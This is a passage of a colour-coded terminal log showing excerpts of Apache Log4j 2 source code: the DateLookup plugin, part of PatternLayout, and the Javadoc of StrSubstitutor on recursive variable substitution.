[2;36m                    [0m         [1;36m30[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"date"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:public class DateLookup implements StrLookup [0m[1;39m{[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    private static final Logger LOGGER = [0m[1;35mStatusLogger.getLogger[0m[1;39m([0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:     * Get the value of the environment variable.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:     * @param key the format to use. If null, the default DateFormat will be [0m    [2m                [0m
[2;36m                    [0m         [39mused.[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * @return The value of the environment variable.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:        return [0m[1;35mformatDate[0m[1;39m([0m[1;35mSystem.currentTimeMillis[0m[1;39m([0m[1;39m)[0m[39m, key[0m[1;39m)[0m[39m;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:     * Get the value of the environment variable.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * @param event The current LogEvent [0m[1;39m([0m[39mis ignored by this StrLookup[0m[1;39m)[0m[39m.[0m         [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     * @param key the format to use. If null, the default DateFormat will be [0m    [2m                [0m
[2;36m                    [0m         [39mused.[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * @return The value of the environment variable.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:        return [0m[1;35mformatDate[0m[1;39m([0m[1;35mevent.getMillis[0m[1;39m([0m[1;39m)[0m[39m, key[0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:    private String [0m[1;35mformatDate[0m[1;39m([0m[39mfinal long date, final String format[0m[1;39m)[0m[39m [0m[1;39m{[0m            [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:        DateFormat dateFormat = null;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        if [0m[1;39m([0m[39mformat != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:            try [0m[1;39m{[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:                dateFormat = new [0m[1;35mSimpleDateFormat[0m[1;39m([0m[39mformat[0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:                [0m[1;35mLOGGER.error[0m[1;39m([0m[32m"Invalid date format: \""[0m[39m + format + [0m[32m"\", using [0m    [2m                [0m
[2;36m                    [0m         [32mdefault"[0m[39m, ex[0m[1;39m)[0m[39m;[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        if [0m[1;39m([0m[39mdateFormat == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:            dateFormat = [0m[1;35mDateFormat.getInstance[0m[1;39m([0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:        return [0m[1;35mdateFormat.format[0m[1;39m([0m[39mnew [0m[1;35mDate[0m[1;39m([0m[39mdate[0m[1;39m)[0m[1;39m)[0m[39m;[0m                                [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/layout/PatternLayout.jav[0m[1;92ma:80[0m[39m-[0m[1;36m180[0m   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:    private List<PatternFormatter> formatters;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:     * Conversion pattern.[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:    private final String conversionPattern;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m89[0m[39m:     * The current Configuration.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m90[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m91[0m[39m:    private final Configuration config;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m92[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m93[0m[39m:    private final RegexReplacement replace;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m94[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m95[0m[39m:    private final boolean handleExceptions;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m96[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m97[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m98[0m[39m:     * Constructs a EnhancedPatternLayout using the supplied conversion pattern.[0m [2m                [0m
[2;36m                    [0m         [1;36m99[0m[39m:     *[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m:     * @param config The Configuration.[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m101[0m[39m:     * @param replace The regular expression to match.[0m                          [2m                [0m
[2;36m                    [0m         [1;36m102[0m[39m:     * @param pattern conversion pattern.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m103[0m[39m:     * @param charset The character set.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m104[0m[39m:     * @param handleExceptions Whether or not exceptions should always be [0m      [2m                [0m
[2;36m                    [0m         [39mhandled in this pattern [0m[1;39m([0m[39mif [0m[1;39m{[0m[39m@code true[0m[1;39m}[0m[39m,[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m105[0m[39m:     *                         exceptions will be written even if the pattern [0m  [2m                [0m
[2;36m                    [0m         [39mdoes not specify so[0m[1;39m)[0m[39m.[0m                                                               [2m                [0m
[2;36m                    [0m         [1;36m106[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m107[0m[39m:    private [0m[1;35mPatternLayout[0m[1;39m([0m[39mfinal Configuration config, final RegexReplacement [0m   [2m                [0m
[2;36m                    [0m         [39mreplace, final String pattern,[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m108[0m[39m:                          final Charset charset, final boolean [0m                 [2m                [0m
[2;36m                    [0m         [39mhandleExceptions[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                                 [2m                [0m
[2;36m                    [0m         [1;36m109[0m[39m:        [0m[1;35msuper[0m[1;39m([0m[39mcharset[0m[1;39m)[0m[39m;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:        this.replace = replace;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m111[0m[39m:        this.conversionPattern = pattern;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m112[0m[39m:        this.config = config;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m113[0m[39m:        this.handleExceptions = handleExceptions;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m114[0m[39m:        final PatternParser parser = [0m[1;35mcreatePatternParser[0m[1;39m([0m[39mconfig[0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m115[0m[39m:        formatters = [0m[1;35mparser.parse[0m[1;39m([0m[39mpattern == null ? DEFAULT_CONVERSION_PATTERN [0m [2m                [0m
[2;36m                    [0m         [39m: pattern, this.handleExceptions[0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m116[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m117[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:     * Set the <b>ConversionPattern<[0m[35m/[0m[95mb[0m[39m> option. This is the string which[0m        [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:     * controls formatting and consists of a mix of literal content and[0m         [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:     * conversion specifiers.[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m123[0m[39m:     * @param conversionPattern conversion pattern.[0m                             [2m                [0m
[2;36m                    [0m         [1;36m124[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m125[0m[39m:    public void [0m[1;35msetConversionPattern[0m[1;39m([0m[39mfinal String conversionPattern[0m[1;39m)[0m[39m [0m[1;39m{[0m          [2m                [0m
[2;36m                    [0m         [1;36m126[0m[39m:        final String pattern = [0m                                                 [2m                [0m
[2;36m                    [0m         [1;35mOptionConverter.convertSpecialChars[0m[1;39m([0m[39mconversionPattern[0m[1;39m)[0m[39m;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m127[0m[39m:        if [0m[1;39m([0m[39mpattern == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m128[0m[39m:            return;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m129[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m130[0m[39m:        final PatternParser parser = [0m[1;35mcreatePatternParser[0m[1;39m([0m[39mthis.config[0m[1;39m)[0m[39m;[0m          [2m                [0m
[2;36m                    [0m         [1;36m131[0m[39m:        formatters = [0m[1;35mparser.parse[0m[1;39m([0m[39mpattern, this.handleExceptions[0m[1;39m)[0m[39m;[0m              [2m                [0m
[2;36m                    [0m         [1;36m132[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m133[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m134[0m[39m:    public String [0m[1;35mgetConversionPattern[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m135[0m[39m:        return conversionPattern;[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m136[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m137[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m138[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m139[0m[39m:     * PatternLayout's content format is specified by:<p/>[0m                      [2m                [0m
[2;36m                    [0m         [1;36m140[0m[39m:     * Key: [0m[32m"structured"[0m[39m Value: [0m[32m"false"[0m[39m<p/>[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m141[0m[39m:     * Key: [0m[32m"formatType"[0m[39m Value: [0m[32m"conversion"[0m[39m [0m[1;39m([0m[39mformat uses the keywords [0m         [2m                [0m
[2;36m                    [0m         [39msupported by OptionConverter[0m[1;39m)[0m[39m<p/>[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m142[0m[39m:     * Key: [0m[32m"format"[0m[39m Value: provided [0m[32m"conversionPattern"[0m[39m param[0m                  [2m                [0m
[2;36m                    [0m         [1;36m143[0m[39m:     * @return Map of content format keys supporting PatternLayout[0m              [2m                [0m
[2;36m                    [0m         [1;36m144[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m145[0m[39m:    @Override[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m146[0m[39m:    public Map<String, String> [0m[1;35mgetContentFormat[0m[1;39m([0m[1;39m)[0m                               [2m                [0m
[2;36m                    [0m         [1;36m147[0m[39m:    [0m[1;39m{[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m148[0m[39m:        final Map<String, String> result = new HashMap<String, String>[0m[1;39m([0m[1;39m)[0m[39m;[0m       [2m                [0m
[2;36m                    [0m         [1;36m149[0m[39m:        [0m[1;35mresult.put[0m[1;39m([0m[32m"structured"[0m[39m, [0m[32m"false"[0m[1;39m)[0m[39m;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m150[0m[39m:        [0m[1;35mresult.put[0m[1;39m([0m[32m"formatType"[0m[39m, [0m[32m"conversion"[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m151[0m[39m:        [0m[1;35mresult.put[0m[1;39m([0m[32m"format"[0m[39m, conversionPattern[0m[1;39m)[0m[39m;[0m                                [2m                [0m
[2;36m                    [0m         [1;36m152[0m[39m:        return result;[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m153[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m154[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m155[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m156[0m[39m:     * Formats a logging event to a writer.[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m157[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m158[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m159[0m[39m:     * @param event logging event to be formatted.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m160[0m[39m:     * @return The event formatted as a String.[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m161[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m162[0m[39m:    @Override[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m163[0m[39m:    public String [0m[1;35mtoSerializable[0m[1;39m([0m[39mfinal LogEvent event[0m[1;39m)[0m[39m [0m[1;39m{[0m                        [2m                [0m
[2;36m                    [0m         [1;36m164[0m[39m:        final StringBuilder buf = new [0m[1;35mStringBuilder[0m[1;39m([0m[1;39m)[0m[39m;[0m                          [2m                [0m
[2;36m                    [0m         [1;36m165[0m[39m:        for [0m[1;39m([0m[39mfinal PatternFormatter formatter : formatters[0m[1;39m)[0m[39m [0m[1;39m{[0m                   [2m                [0m
[2;36m                    [0m         [1;36m166[0m[39m:            [0m[1;35mformatter.format[0m[1;39m([0m[39mevent, buf[0m[1;39m)[0m[39m;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m167[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m168[0m[39m:        String str = [0m[1;35mbuf.toString[0m[1;39m([0m[1;39m)[0m[39m;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m169[0m[39m:        if [0m[1;39m([0m[39mreplace != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m170[0m[39m:            str = [0m[1;35mreplace.format[0m[1;39m([0m[39mstr[0m[1;39m)[0m[39m;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m171[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m172[0m[39m:        return str;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m173[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m174[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m175[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m176[0m[39m:     * Create a PatternParser.[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m177[0m[39m:     * @param config The Configuration.[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m178[0m[39m:     * @return The PatternParser.[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m179[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m180[0m[39m:    public static PatternParser [0m[1;35mcreatePatternParser[0m[1;39m([0m[39mfinal Configuration config[0m[1;39m)[0m [2m                [0m
[2;36m                    [0m         [1;39m{[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.jav[0m[1;92ma:1[0m[39m-[0m[1;36m100[0m   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.util.ArrayList;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import java.util.Enumeration;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import java.util.HashMap;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import java.util.Iterator;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import java.util.List;[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import java.util.Map;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import java.util.Properties;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m: * Substitutes variables within a string by values.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m: * This class takes a piece of text and substitutes all the variables within it.[0m [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m: * The default definition of a variable is <code>$[0m[1;39m{[0m[39mvariableName[0m[1;39m}[0m[39m<[0m[35m/[0m[95mcode[0m[39m>.[0m         [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m: * The prefix and suffix can be changed via constructors and set methods.[0m        [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m: * Variable values are typically resolved from a map, but could also be resolved[0m [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m: * from system properties, or by supplying a custom variable resolver.[0m           [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m: * The simplest example is to use this class to replace Java System properties. [0m [2m                [0m
[2;36m                    [0m         [39mFor example:[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m: * <pre>[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m: * [0m[1;35mStrSubstitutor.replaceSystemProperties[0m[1;39m([0m                                       [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m: *      [0m[32m"You are running with java.version = $[0m[32m{[0m[32mjava.version[0m[32m}[0m[32m and os.name = [0m      [2m                [0m
[2;36m                    [0m         [32m$[0m[32m{[0m[32mos.name[0m[32m}[0m[32m."[0m[1;39m)[0m[39m;[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m: * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m: * Typical usage of this class follows the following pattern: First an instance [0m [2m                [0m
[2;36m                    [0m         [39mis created[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m: * and initialized with the map that contains the values for the available [0m      [2m                [0m
[2;36m                    [0m         [39mvariables.[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m: * If a prefix and/or suffix for variables should be used other than the default[0m [2m                [0m
[2;36m                    [0m         [39mones,[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m: * the appropriate settings can be performed. After that the [0m                    [2m                [0m
[2;36m                    [0m         [39m<code>[0m[1;35mreplace[0m[1;39m([0m[1;39m)[0m[39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m: * method can be called passing in the source text for interpolation. In the [0m    [2m                [0m
[2;36m                    [0m         [39mreturned[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m: * text all variable references [0m[1;39m([0m[39mas long as their values are known[0m[1;39m)[0m[39m will be [0m     [2m                [0m
[2;36m                    [0m         [39mresolved.[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m: * The following example demonstrates this:[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m: * <pre>[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m: * Map valuesMap = [0m[1;35mHashMap[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m: * [0m[1;35mvaluesMap.put[0m[1;39m([0m[39m&quot;animal&quot;, &quot;quick brown fox&quot;[0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m: * [0m[1;35mvaluesMap.put[0m[1;39m([0m[39m&quot;target&quot;, &quot;lazy dog&quot;[0m[1;39m)[0m[39m;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m: * String templateString = &quot;The $[0m[1;39m{[0m[39manimal[0m[1;39m}[0m[39m jumped over the $[0m[1;39m{[0m[39mtarget[0m[1;39m}[0m[39m.&quot;;[0m [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m: * StrSubstitutor sub = new [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mvaluesMap[0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m: * String resolvedString = [0m[1;35msub.replace[0m[1;39m([0m[39mtemplateString[0m[1;39m)[0m[39m;[0m                          [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m: * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m: * yielding:[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m: * <pre>[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m: *      The quick brown fox jumped over the lazy dog.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m: * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m: * In addition to this usage pattern there are some static convenience methods [0m  [2m                [0m
[2;36m                    [0m         [39mthat[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m: * cover the most common use cases. These methods can be used without the need [0m  [2m                [0m
[2;36m                    [0m         [39mof[0m                                                                                  [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m: * manually creating an instance. However if multiple replace operations are to [0m [2m                [0m
[2;36m                    [0m         [39mbe[0m                                                                                  [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m: * performed, creating and reusing an instance of this class will be more [0m       [2m                [0m
[2;36m                    [0m         [39mefficient.[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m: * Variable replacement works in a recursive way. Thus, if a variable value [0m     [2m                [0m
[2;36m                    [0m         [39mcontains[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m: * a variable then that variable will also be replaced. Cyclic replacements are[0m  [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m: * detected and will cause an exception to be thrown.[0m                            [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m: * Sometimes the interpolation's result must contain a variable prefix. As an [0m   [2m                [0m
[2;36m                    [0m         [39mexample[0m                                                                             [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m: * take the following source text:[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m: * <pre>[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m: *   The variable $[0m[1;39m{[0m[39m$[0m[1;39m{[0m[39mname[0m[1;39m}[0m[1;39m}[0m[39m must be used.[0m                                       [2m                [0m
